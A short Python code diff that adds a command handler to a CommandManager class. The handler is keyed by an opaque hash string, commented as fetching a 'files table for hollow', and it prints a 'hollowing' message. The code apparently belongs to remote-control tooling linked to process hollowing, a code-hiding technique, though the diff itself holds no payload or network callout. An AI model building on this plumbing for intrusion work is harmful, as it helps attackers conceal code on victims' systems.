@@ -35,11 +35,15 @@ class CommandManager(object):
             self.writer(gen_xml(self.tag, **message).encode())
             status = self.reader().decode(errors='replace').strip()
             return tryParse(int, status, 1) == 0
+        if command == "ce52e112fb976b2d277f09b6eada379f": #Get files table for hollow
+            self.writer(gen_xml(self.tag, **message).encode())
+            print("end Processing hollowing")
+            return json.loads(self.reader().decode(errors='replace'))
 
         command = gen_xml(self.tag, command=command)
         self.writer(command.encode())
         return self.reader().decode(errors='replace')
-       
+        
     def isValid(self,*args) -> bool:
         for i in args:
             if i == None:
